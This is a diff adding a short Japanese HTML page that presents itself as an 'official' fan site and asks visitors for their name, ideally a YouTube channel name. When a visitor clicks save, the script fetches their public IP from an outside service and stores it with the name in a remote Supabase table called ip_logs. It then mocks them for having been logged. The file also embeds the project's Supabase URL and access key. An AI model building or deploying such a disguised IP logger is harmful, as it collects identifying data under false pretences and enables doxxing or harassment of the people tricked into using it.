@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>K0nohaサイト公式</title>
+</head>
+<body>
+  <h1>K0nohaサイト</h1>
+
+  <label for="name">名前を入力してください（Youtubeチャンネル名推奨）：</label>
+  <input type="text" id="name" placeholder="名前を入力">
+  <button id="log-btn">保存</button>
+
+  <p id="status">保存を押したら使えます</p>
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+  <script>
+    const SUPABASE_URL = "https://qeydytpzcgucerzjocql.supabase.co";
+    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFleWR5dHB6Y2d1Y2VyempvY3FsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTc0Mjg3MTIsImV4cCI6MjA3MzAwNDcxMn0.Ikh2yM20YhpLyB1Th7SsW0m66o3JO8ANeLQlxR8ZWXE";
+
+    const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+    async function logIPAddressAndName() {
+      const name = document.getElementById('name').value.trim();
+      if (!name) {
+        alert('名前を入力してください');
+        return;
+      }
+
+      try {
+        const response = await fetch("https://api.ipify.org?format=json");
+        const data = await response.json();
+        const ip = data.ip;
+
+        const { error } = await supabaseClient.from("ip_logs").insert([
+          { ip_address: ip, user_name: name }
+        ]);
+
+        if (error) {
+          console.error("保存に失敗:", error);
+          document.getElementById("status").innerText = "保存に失敗しました。";
+        } else {
+          document.getElementById("status").innerText = `あなたのIPアドレス ${ip} と名前「${name}」を保存しました（笑）`;
+        }
+      } catch (err) {
+        console.error("IP取得エラー:", err);
+        document.getElementById("status").innerText = "保存に失敗しました。";
+      }
+    }
+
+    document.getElementById('log-btn').addEventListener('click', logIPAddressAndName);
+  </script>
+</body>
+</html>
